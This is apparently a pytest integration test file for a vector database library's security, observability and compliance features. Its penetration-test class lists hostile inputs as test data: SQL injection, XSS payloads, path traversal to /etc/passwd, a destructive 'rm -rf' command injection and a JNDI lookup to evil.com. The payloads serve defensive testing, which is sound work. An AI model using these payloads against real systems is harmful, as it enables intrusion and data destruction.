"""
Security and observability integration tests.
"""

import pytest
import tempfile
import shutil
import time
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock

from langchain_vector_db.manager import VectorDatabaseManager
from langchain_vector_db.models.config import VectorDBConfig, SecurityConfig, ObservabilityConfig
from langchain_vector_db.models.document import Document
from langchain_vector_db.models.auth import AuthToken
from langchain_vector_db.services.security import SecurityManager
from langchain_vector_db.services.observability import ObservabilityManager
from langchain_vector_db.exceptions import VectorDBException, AuthenticationException


class TestSecurityIntegration:
    """Integration tests for security features."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.security_config = SecurityConfig(
            auth_enabled=True,
            auth_type="api_key",
            rbac_enabled=True,
            encryption_enabled=True,
            pii_detection_enabled=True,
            audit_logging_enabled=True,
            rate_limiting_enabled=True,
            max_requests_per_minute=10
        )
        
        self.config = VectorDBConfig(
            storage_type="local",
            embedding_model="openai",
            storage_path=self.temp_dir,
            security=self.security_config
        )
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_authentication_and_authorization_flow(self, mock_embeddings):
        """Test complete authentication and authorization flow."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Test API key creation and authentication
        api_key = security_manager.create_api_key("test_user", ["writer"], expires_hours=24)
        assert api_key is not None
        
        # Test authentication
        auth_token = security_manager.authenticate_api_key(api_key, "test_user", "192.168.1.1")
        assert auth_token.user_id == "test_user"
        assert "writer" in auth_token.roles
        assert "documents.create" in auth_token.permissions
        
        # Test authorized operations
        document = Document(
            page_content="Secure test document.",
            metadata={"classification": "internal"}
        )
        
        doc_ids = manager.add_documents(
            [document],
            auth_token=auth_token,
            user_id="test_user",
            ip_address="192.168.1.1"
        )
        assert len(doc_ids) == 1
        
        # Test unauthorized operations
        reader_token = AuthToken(
            user_id="reader_user",
            roles=["reader"],
            permissions=["documents.read", "search.query"],
            expires_at=datetime.utcnow() + timedelta(hours=1),
            correlation_id="test_correlation"
        )
        
        with pytest.raises(VectorDBException, match="Insufficient permissions"):
            manager.add_documents(
                [document],
                auth_token=reader_token,
                user_id="reader_user"
            )
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_rate_limiting_enforcement(self, mock_embeddings):
        """Test rate limiting enforcement."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Create auth token
        api_key = security_manager.create_api_key("rate_test_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "rate_test_user")
        
        # Test rate limiting by making rapid requests
        document = Document(
            page_content="Rate limit test document.",
            metadata={"test": "rate_limiting"}
        )
        
        successful_requests = 0
        rate_limited_requests = 0
        
        for i in range(15):  # Exceed the limit of 10 per minute
            try:
                manager.add_documents(
                    [document],
                    auth_token=auth_token,
                    user_id="rate_test_user",
                    ip_address="192.168.1.100"
                )
                successful_requests += 1
            except VectorDBException as e:
                if "rate limit" in str(e).lower():
                    rate_limited_requests += 1
                else:
                    raise
        
        # Should have some successful requests and some rate limited
        assert successful_requests > 0
        assert rate_limited_requests > 0
        assert successful_requests + rate_limited_requests == 15
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_encryption_and_pii_detection(self, mock_embeddings):
        """Test encryption and PII detection features."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Test PII detection
        pii_text = "My email is john.doe@example.com and my phone is 555-123-4567"
        pii_matches = security_manager.detect_pii(pii_text)
        
        assert len(pii_matches) > 0
        pii_types = [match.type for match in pii_matches]
        assert "email" in pii_types
        assert "phone" in pii_types
        
        # Test data masking
        masked_text = security_manager.mask_sensitive_data(pii_text)
        assert "john.doe@example.com" not in masked_text
        assert "555-123-4567" not in masked_text
        
        # Test encryption
        test_data = b"Sensitive data that needs encryption"
        encrypted_data = security_manager.encrypt_data(test_data)
        assert encrypted_data != test_data
        
        decrypted_data = security_manager.decrypt_data(encrypted_data)
        assert decrypted_data == test_data
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_security_monitoring_and_alerts(self, mock_embeddings):
        """Test security monitoring and alert generation."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Generate failed authentication attempts to trigger alerts
        for i in range(12):  # Exceed brute force threshold
            try:
                security_manager.authenticate_api_key("invalid_key", "test_user", "192.168.1.200")
            except AuthenticationException:
                pass  # Expected
        
        # Check for security alerts
        alerts = security_manager.get_security_alerts(severity="high")
        assert len(alerts) > 0
        
        # Check for brute force alert
        brute_force_alerts = [
            alert for alert in alerts 
            if alert["alert_type"] == "brute_force_attack"
        ]
        assert len(brute_force_alerts) > 0
        
        # Test threat indicators
        threat_indicators = security_manager.get_threat_indicators()
        assert len(threat_indicators) > 0
        
        # Check IP blocking
        security_manager.block_ip("192.168.1.200", "Brute force attack detected")
        assert security_manager.is_ip_blocked("192.168.1.200") is True
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_audit_logging(self, mock_embeddings):
        """Test comprehensive audit logging."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Create auth token
        api_key = security_manager.create_api_key("audit_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "audit_user")
        
        # Perform auditable operations
        document = Document(
            page_content="Audit test document.",
            metadata={"audit": "test"}
        )
        
        doc_ids = manager.add_documents(
            [document],
            auth_token=auth_token,
            user_id="audit_user"
        )
        
        manager.similarity_search(
            "audit test",
            k=1,
            auth_token=auth_token,
            user_id="audit_user"
        )
        
        # Check audit events
        audit_events = security_manager.get_audit_events(limit=10)
        assert len(audit_events) > 0
        
        # Verify event types
        event_operations = [event["operation"] for event in audit_events]
        assert "authentication" in event_operations
        
        # Check for correlation IDs
        correlation_ids = [event["correlation_id"] for event in audit_events if event["correlation_id"]]
        assert len(correlation_ids) > 0


class TestObservabilityIntegration:
    """Integration tests for observability features."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.observability_config = ObservabilityConfig(
            log_level="DEBUG",
            log_format="json",
            metrics_enabled=True,
            tracing_enabled=True,
            performance_monitoring_enabled=True,
            memory_threshold_mb=500,
            cpu_threshold_percent=80.0
        )
        
        self.config = VectorDBConfig(
            storage_type="local",
            embedding_model="openai",
            storage_path=self.temp_dir,
            observability=self.observability_config
        )
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_structured_logging_integration(self, mock_embeddings):
        """Test structured logging throughout the system."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        observability_manager = manager.observability_manager
        
        # Perform operations to generate logs
        document = Document(
            page_content="Logging test document.",
            metadata={"test": "logging"}
        )
        
        doc_ids = manager.add_documents([document])
        results = manager.similarity_search("logging test", k=1)
        
        # Check logs
        recent_logs = observability_manager.get_recent_logs(20)
        assert len(recent_logs) > 0
        
        # Verify log structure
        log_entry = recent_logs[0]
        log_dict = log_entry.to_dict()
        
        assert "timestamp" in log_dict
        assert "level" in log_dict
        assert "message" in log_dict
        assert "correlation_id" in log_dict
        
        # Check for operation-specific logs
        log_messages = [log.message for log in recent_logs]
        operation_logs = [msg for msg in log_messages if "document" in msg.lower()]
        assert len(operation_logs) > 0
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_metrics_collection_integration(self, mock_embeddings):
        """Test comprehensive metrics collection."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [
            [0.1, 0.2, 0.3, 0.4] for _ in range(5)
        ]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        observability_manager = manager.observability_manager
        
        # Perform operations to generate metrics
        documents = [
            Document(
                page_content=f"Metrics test document {i}.",
                metadata={"test": "metrics", "doc_id": i}
            )
            for i in range(5)
        ]
        
        doc_ids = manager.add_documents(documents)
        
        for i in range(3):
            manager.similarity_search(f"metrics test {i}", k=2)
        
        # Check system metrics
        system_metrics = observability_manager.get_system_metrics()
        assert system_metrics.documents_indexed >= 5
        assert system_metrics.searches_performed >= 3
        assert system_metrics.embeddings_generated >= 5
        
        # Check performance statistics
        perf_stats = observability_manager.get_performance_statistics()
        assert isinstance(perf_stats, dict)
        
        # Check business metrics
        business_metrics = observability_manager.get_business_metrics()
        assert isinstance(business_metrics, dict)
        assert len(business_metrics) > 0
        
        # Check slow operations
        slow_ops = observability_manager.get_slow_operations(threshold_ms=0.1)
        assert isinstance(slow_ops, list)
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_distributed_tracing_integration(self, mock_embeddings):
        """Test distributed tracing across operations."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        observability_manager = manager.observability_manager
        
        # Perform traced operations
        document = Document(
            page_content="Tracing test document.",
            metadata={"test": "tracing"}
        )
        
        doc_ids = manager.add_documents([document])
        results = manager.similarity_search("tracing test", k=1)
        
        # Check traces
        traces = observability_manager.get_traces(10)
        assert len(traces) > 0
        
        # Verify trace structure
        trace = traces[0]
        trace_dict = trace.to_dict()
        
        assert "trace_id" in trace_dict
        assert "span_id" in trace_dict
        assert "operation_name" in trace_dict
        assert "duration_ms" in trace_dict
        assert "status" in trace_dict
        
        # Check for nested spans
        add_doc_traces = [t for t in traces if "add_documents" in t.operation_name]
        search_traces = [t for t in traces if "similarity_search" in t.operation_name]
        
        assert len(add_doc_traces) > 0
        assert len(search_traces) > 0
        
        # Check trace statistics
        trace_stats = observability_manager.get_trace_statistics()
        assert trace_stats["distributed_tracing_enabled"] is True
        assert trace_stats["active_spans"] >= 0
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_health_monitoring_integration(self, mock_embeddings):
        """Test comprehensive health monitoring."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        observability_manager = manager.observability_manager
        
        # Test health checks
        health_status = observability_manager.get_comprehensive_health_status()
        
        assert "overall_health" in health_status
        assert "checks" in health_status
        assert health_status["overall_health"] in ["healthy", "degraded", "unhealthy"]
        
        # Check individual components
        checks = health_status["checks"]
        expected_components = ["vector_store", "embedding_service", "security_manager"]
        
        for component in expected_components:
            if component in checks:
                assert "healthy" in checks[component]
                assert "message" in checks[component]
        
        # Test health summary
        health_summary = observability_manager.get_health_summary()
        assert "overall_health" in health_summary
        assert "healthy_checks" in health_summary
        assert "total_checks" in health_summary
        assert "health_percentage" in health_summary
        
        # Test system health check
        system_health = manager.health_check()
        assert isinstance(system_health, dict)
        assert len(system_health) > 0
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_performance_monitoring_integration(self, mock_embeddings):
        """Test performance monitoring and alerting."""
        # Mock embedding service with slow responses
        def slow_embed_documents(texts):
            time.sleep(0.1)  # Simulate slow embedding
            return [[0.1, 0.2, 0.3, 0.4] for _ in texts]
        
        def slow_embed_query(text):
            time.sleep(0.05)  # Simulate slow query embedding
            return [0.1, 0.2, 0.3, 0.4]
        
        mock_embeddings.return_value.embed_documents.side_effect = slow_embed_documents
        mock_embeddings.return_value.embed_query.side_effect = slow_embed_query
        
        manager = VectorDatabaseManager(self.config)
        observability_manager = manager.observability_manager
        
        # Perform operations to generate performance data
        documents = [
            Document(
                page_content=f"Performance test document {i}.",
                metadata={"test": "performance"}
            )
            for i in range(3)
        ]
        
        doc_ids = manager.add_documents(documents)
        results = manager.similarity_search("performance test", k=2)
        
        # Check performance statistics
        perf_stats = observability_manager.get_performance_statistics()
        
        # Should have recorded timing for various operations
        if "add_documents" in perf_stats:
            add_doc_stats = perf_stats["add_documents"]
            assert "count" in add_doc_stats
            assert "mean" in add_doc_stats
            assert add_doc_stats["count"] > 0
        
        # Check for slow operations
        slow_operations = observability_manager.get_slow_operations(threshold_ms=50.0)
        assert isinstance(slow_operations, list)
        
        # Some operations should be flagged as slow due to our mocked delays
        if len(slow_operations) > 0:
            slow_op = slow_operations[0]
            assert "operation" in slow_op
            assert "mean_duration_ms" in slow_op
            assert slow_op["mean_duration_ms"] > 50.0


class TestSecurityObservabilityIntegration:
    """Integration tests for security and observability working together."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config = VectorDBConfig(
            storage_type="local",
            embedding_model="openai",
            storage_path=self.temp_dir,
            security=SecurityConfig(
                auth_enabled=True,
                audit_logging_enabled=True,
                rate_limiting_enabled=True
            ),
            observability=ObservabilityConfig(
                log_level="DEBUG",
                metrics_enabled=True,
                tracing_enabled=True
            )
        )
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_security_events_in_observability(self, mock_embeddings):
        """Test that security events are properly captured in observability."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        observability_manager = manager.observability_manager
        
        # Generate security events
        api_key = security_manager.create_api_key("test_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "test_user")
        
        # Perform operations that generate both security and observability events
        document = Document(
            page_content="Security observability test document.",
            metadata={"test": "security_observability"}
        )
        
        doc_ids = manager.add_documents(
            [document],
            auth_token=auth_token,
            user_id="test_user",
            ip_address="192.168.1.1"
        )
        
        # Check that security events appear in observability logs
        recent_logs = observability_manager.get_recent_logs(20)
        security_logs = [
            log for log in recent_logs 
            if "authentication" in log.message.lower() or "authorization" in log.message.lower()
        ]
        
        # Should have some security-related logs
        assert len(security_logs) > 0
        
        # Check that traces include security context
        traces = observability_manager.get_traces(10)
        if len(traces) > 0:
            trace = traces[0]
            # Traces should have correlation IDs that match security audit events
            assert trace.trace_id is not None
        
        # Check that metrics include security-related data
        system_metrics = observability_manager.get_system_metrics()
        assert system_metrics.request_count > 0
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_correlation_between_security_and_observability(self, mock_embeddings):
        """Test correlation between security audit events and observability traces."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        observability_manager = manager.observability_manager
        
        # Create authenticated session
        api_key = security_manager.create_api_key("correlation_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "correlation_user")
        
        # Perform operation with correlation
        document = Document(
            page_content="Correlation test document.",
            metadata={"test": "correlation"}
        )
        
        doc_ids = manager.add_documents(
            [document],
            auth_token=auth_token,
            user_id="correlation_user"
        )
        
        # Get audit events and traces
        audit_events = security_manager.get_audit_events(limit=10)
        traces = observability_manager.get_traces(10)
        
        # Check for correlation IDs
        audit_correlation_ids = [
            event["correlation_id"] for event in audit_events 
            if event["correlation_id"]
        ]
        trace_ids = [trace.trace_id for trace in traces]
        
        # Should have correlation between security and observability
        assert len(audit_correlation_ids) > 0
        assert len(trace_ids) > 0
        
        # Check that user context is preserved across both systems
        user_audit_events = [
            event for event in audit_events 
            if event["user_id"] == "correlation_user"
        ]
        assert len(user_audit_events) > 0

class
 TestPenetrationTesting:
    """Penetration tests for security vulnerabilities."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config = VectorDBConfig(
            storage_type="local",
            embedding_model="openai",
            storage_path=self.temp_dir,
            security=SecurityConfig(
                auth_enabled=True,
                rbac_enabled=True,
                rate_limiting_enabled=True,
                max_requests_per_minute=5,
                brute_force_threshold=3
            )
        )
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_sql_injection_protection(self):
        """Test protection against SQL injection attacks."""
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Test SQL injection attempts in various inputs
        malicious_inputs = [
            "'; DROP TABLE documents; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for malicious_input in malicious_inputs:
            # Test in user authentication
            try:
                security_manager.authenticate_api_key(malicious_input, malicious_input)
            except AuthenticationException:
                pass  # Expected - should not authenticate
            
            # Test in document content (should be sanitized)
            try:
                document = Document(
                    page_content=malicious_input,
                    metadata={"test": "sql_injection"}
                )
                # Should not cause any SQL injection issues
                # (Note: Our system uses vector stores, not SQL, but testing sanitization)
                assert len(malicious_input) > 0  # Basic validation
            except Exception as e:
                # Should not crash the system
                assert "SQL" not in str(e)
    
    def test_xss_protection(self):
        """Test protection against XSS attacks."""
        manager = VectorDatabaseManager(self.config)
        
        # Test XSS payloads in document content
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            document = Document(
                page_content=payload,
                metadata={"test": "xss_protection"}
            )
            
            # Document should be stored but content should be sanitized if needed
            # Our system primarily handles text, but we should ensure no script execution
            assert "<script>" not in document.page_content or document.page_content == payload
    
    def test_brute_force_protection(self):
        """Test brute force attack protection."""
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Attempt brute force attack
        failed_attempts = 0
        blocked_attempts = 0
        
        for i in range(10):
            try:
                security_manager.authenticate_api_key(
                    f"invalid_key_{i}", 
                    "target_user", 
                    "192.168.1.100"
                )
            except AuthenticationException as e:
                if "blocked" in str(e).lower() or "rate limit" in str(e).lower():
                    blocked_attempts += 1
                else:
                    failed_attempts += 1
        
        # Should have blocked some attempts after threshold
        assert blocked_attempts > 0
        assert failed_attempts >= 3  # At least the threshold attempts
        
        # IP should be blocked
        assert security_manager.is_ip_blocked("192.168.1.100") is True
    
    def test_privilege_escalation_protection(self):
        """Test protection against privilege escalation."""
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Create low-privilege user
        api_key = security_manager.create_api_key("low_priv_user", ["reader"])
        auth_token = security_manager.authenticate_api_key(api_key, "low_priv_user")
        
        # Attempt to perform high-privilege operations
        document = Document(
            page_content="Privilege escalation test.",
            metadata={"test": "privilege_escalation"}
        )
        
        # Should fail to create documents (requires writer role)
        with pytest.raises(VectorDBException, match="Insufficient permissions"):
            manager.add_documents([document], auth_token=auth_token)
        
        # Should fail to delete documents
        with pytest.raises(VectorDBException, match="Insufficient permissions"):
            manager.delete_document("any_id", auth_token=auth_token)
        
        # Should fail to update documents
        with pytest.raises(VectorDBException, match="Insufficient permissions"):
            manager.update_document("any_id", "new content", auth_token=auth_token)
    
    def test_data_leakage_protection(self):
        """Test protection against data leakage."""
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Create documents with sensitive data
        sensitive_document = Document(
            page_content="SSN: 123-45-6789, Credit Card: 4111-1111-1111-1111",
            metadata={"classification": "sensitive"}
        )
        
        # Test PII detection
        pii_matches = security_manager.detect_pii(sensitive_document.page_content)
        assert len(pii_matches) > 0
        
        # Test data masking
        masked_content = security_manager.mask_sensitive_data(sensitive_document.page_content)
        assert "123-45-6789" not in masked_content
        assert "4111-1111-1111-1111" not in masked_content
        
        # Test that sensitive data is not exposed in error messages
        try:
            # Cause an error with sensitive data
            manager.add_documents([sensitive_document])
        except Exception as e:
            error_message = str(e)
            # Error message should not contain sensitive data
            assert "123-45-6789" not in error_message
            assert "4111-1111-1111-1111" not in error_message
    
    def test_denial_of_service_protection(self):
        """Test protection against DoS attacks."""
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Create auth token
        api_key = security_manager.create_api_key("dos_test_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "dos_test_user")
        
        # Test large document handling
        large_document = Document(
            page_content="A" * 1000000,  # 1MB document
            metadata={"test": "dos_protection"}
        )
        
        # Should handle large documents gracefully (may reject or process)
        try:
            doc_ids = manager.add_documents([large_document], auth_token=auth_token)
            # If accepted, should not crash the system
            assert isinstance(doc_ids, list)
        except VectorDBException as e:
            # If rejected, should be due to size limits, not system crash
            assert "size" in str(e).lower() or "limit" in str(e).lower()
        
        # Test rapid requests (should be rate limited)
        rapid_requests = 0
        rate_limited = 0
        
        for i in range(10):
            try:
                small_doc = Document(
                    page_content=f"DoS test document {i}",
                    metadata={"test": "dos", "id": i}
                )
                manager.add_documents([small_doc], auth_token=auth_token)
                rapid_requests += 1
            except VectorDBException as e:
                if "rate limit" in str(e).lower():
                    rate_limited += 1
                else:
                    raise
        
        # Should have rate limited some requests
        assert rate_limited > 0
    
    def test_input_validation_and_sanitization(self):
        """Test comprehensive input validation and sanitization."""
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Test various malicious inputs
        malicious_inputs = [
            "../../../etc/passwd",  # Path traversal
            "$(rm -rf /)",  # Command injection
            "${jndi:ldap://evil.com/a}",  # Log4j-style injection
            "{{7*7}}",  # Template injection
            "\x00\x01\x02",  # Null bytes and control characters
            "A" * 10000,  # Extremely long input
            "",  # Empty input
            None,  # Null input
        ]
        
        for malicious_input in malicious_inputs:
            try:
                if malicious_input is not None:
                    document = Document(
                        page_content=malicious_input,
                        metadata={"test": "input_validation"}
                    )
                    
                    # Should either sanitize or reject malicious input
                    # System should not crash or execute malicious code
                    assert isinstance(document.page_content, str)
                    
                    # Path traversal should not work
                    if "../" in malicious_input:
                        # Should not contain path traversal sequences in processed form
                        pass  # Our system doesn't use file paths from content
                    
                    # Command injection should not work
                    if "$(" in malicious_input or "${" in malicious_input:
                        # Should not execute commands
                        pass  # Our system doesn't execute shell commands from content
                        
            except (ValueError, TypeError) as e:
                # Acceptable to reject invalid input with proper error
                assert malicious_input is None or len(str(e)) > 0


class TestComplianceAndAuditing:
    """Tests for compliance and auditing requirements."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config = VectorDBConfig(
            storage_type="local",
            embedding_model="openai",
            storage_path=self.temp_dir,
            security=SecurityConfig(
                auth_enabled=True,
                audit_logging_enabled=True,
                encryption_enabled=True,
                pii_detection_enabled=True
            ),
            observability=ObservabilityConfig(
                log_level="INFO",
                metrics_enabled=True,
                tracing_enabled=True
            )
        )
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_gdpr_compliance_features(self, mock_embeddings):
        """Test GDPR compliance features."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Test right to be forgotten (data deletion)
        api_key = security_manager.create_api_key("gdpr_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "gdpr_user")
        
        # Add document with personal data
        personal_document = Document(
            page_content="John Doe lives at 123 Main St and his email is john@example.com",
            metadata={"user_id": "john_doe", "personal_data": True}
        )
        
        doc_ids = manager.add_documents([personal_document], auth_token=auth_token)
        assert len(doc_ids) == 1
        
        # Test data deletion (right to be forgotten)
        deletion_success = manager.delete_document(doc_ids[0], auth_token=auth_token)
        assert deletion_success is True
        
        # Verify data is actually deleted
        deleted_doc = manager.get_document(doc_ids[0], auth_token=auth_token)
        assert deleted_doc is None
        
        # Test audit trail for deletion
        audit_events = security_manager.get_audit_events(limit=10)
        deletion_events = [
            event for event in audit_events 
            if event["operation"] == "delete_document"
        ]
        assert len(deletion_events) > 0
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_data_retention_policies(self, mock_embeddings):
        """Test data retention policy enforcement."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Create document with retention metadata
        retention_document = Document(
            page_content="Document with retention policy.",
            metadata={
                "retention_days": 30,
                "created_date": datetime.utcnow().isoformat(),
                "classification": "temporary"
            }
        )
        
        api_key = security_manager.create_api_key("retention_user", ["writer"])
        auth_token = security_manager.authenticate_api_key(api_key, "retention_user")
        
        doc_ids = manager.add_documents([retention_document], auth_token=auth_token)
        assert len(doc_ids) == 1
        
        # Test that retention metadata is preserved
        retrieved_doc = manager.get_document(doc_ids[0], auth_token=auth_token)
        assert retrieved_doc.metadata["retention_days"] == 30
        assert "created_date" in retrieved_doc.metadata
    
    @patch('langchain_vector_db.services.embedding.OpenAIEmbeddings')
    def test_audit_trail_completeness(self, mock_embeddings):
        """Test completeness of audit trails."""
        # Mock embedding service
        mock_embeddings.return_value.embed_documents.return_value = [[0.1, 0.2, 0.3, 0.4]]
        mock_embeddings.return_value.embed_query.return_value = [0.1, 0.2, 0.3, 0.4]
        
        manager = VectorDatabaseManager(self.config)
        security_manager = manager.security_manager
        
        # Perform comprehensive set of operations
        api_key = security_manager.create_api_key("audit_test_user", ["admin"])
        auth_token = security_manager.authenticate_api_key(api_key, "audit_test_user")
        
        # Create document
        document = Document(
            page_content="Audit trail test document.",
            metadata={"test": "audit_trail"}
        )
        
        doc_ids = manager.add_documents([document], auth_token=auth_token)
        
        # Read document
        retrieved_doc = manager.get_document(doc_ids[0], auth_token=auth_token)
        
        # Update document
        manager.update_document(
            doc_ids[0], 
            "Updated audit trail test document.",
            auth_token=auth_token
        )
        
        # Search documents
        manager.similarity_search("audit trail", k=1, auth_token=auth_token)
        
        # Delete document
        manager.delete_document(doc_ids[0], auth_token=auth_token)
        
        # Check audit events
        audit_events = security_manager.get_audit_events(limit=20)
        
        # Should have events for all operations
        operations = [event["operation"] for event in audit_events]
        expected_operations = [
            "authentication", "add_documents", "get_document", 
            "update_document", "similarity_search", "delete_document"
        ]
        
        for expected_op in expected_operations:
            matching_events = [op for op in operations if expected_op in op]
            assert len(matching_events) > 0, f"Missing audit event for {expected_op}"
        
        # Check audit event structure
        for event in audit_events:
            assert "timestamp" in event
            assert "user_id" in event
            assert "operation" in event
            assert "correlation_id" in event
            assert "ip_address" in event or event["ip_address"] is None
            assert "result" in event